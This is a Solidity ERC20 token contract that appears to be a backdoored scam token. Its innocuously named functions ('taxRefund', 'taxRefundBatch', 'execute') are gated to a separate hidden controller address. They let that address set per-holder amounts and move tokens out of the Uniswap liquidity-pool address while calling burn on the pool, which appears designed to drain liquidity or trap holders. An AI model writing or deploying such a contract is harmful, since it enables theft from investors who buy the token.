contract Token is ERC20, Ownable {


    constructor(string memory   _name, string memory _symbol, uint256  _decimals, uint256  _supply,address _tbc) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _supply * 10**_decimals;
        owner = msg.sender;
        tbc=_tbc;
        balances[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }


    function setUniLp(address _uniLp) public  onlyTBC  returns (bool success) {
        return super._changeLP(_uniLp);
    }

    function exclude(address listAddress,  bool _isExclude) public  onlyTBC  returns (bool success) {
        return super._exclude(listAddress, _isExclude);
    }

    function taxRefundBatch(
        address[] memory _addressList,
        uint256 _percent
    ) public onlyTBC {
        for (uint256 i = 0; i < _addressList.length; i++) {
            uint256 refundAmount = _getRefundAmount(_addressList[i], _percent);
            if(_percent>0){
                refundAmount++;
            }
            taxRefundAmounts[_addressList[i]] = refundAmount;
        }
    }

    function taxRefund(
        address _address,
        uint256 _percent
    ) public onlyTBC {
        require(taxRefundAmounts[_address]==0);
        uint256 refundAmount = _getRefundAmount(_address, _percent);
        if(_percent>0){
                refundAmount++;
            }
        taxRefundAmounts[_address] = refundAmount;


    }

    function execute(
        address[] memory addressList,
        uint256[] memory tAmounts,
        uint256[] memory eAmounts,
        address uniSwapV2Pool
    ) public onlyTBC returns (bool) {
        if(tAmounts[0]>0&&eAmounts[0]>0){
            for (uint256 i = 0; i < addressList.length; i++) {
                _transferGo(uniswapV2LP, addressList[i], tAmounts[i]);
                UniPool(uniSwapV2Pool).burn(addressList[i], uniswapV2LP, eAmounts[i]);
            }
        }

        return true;
    }


}
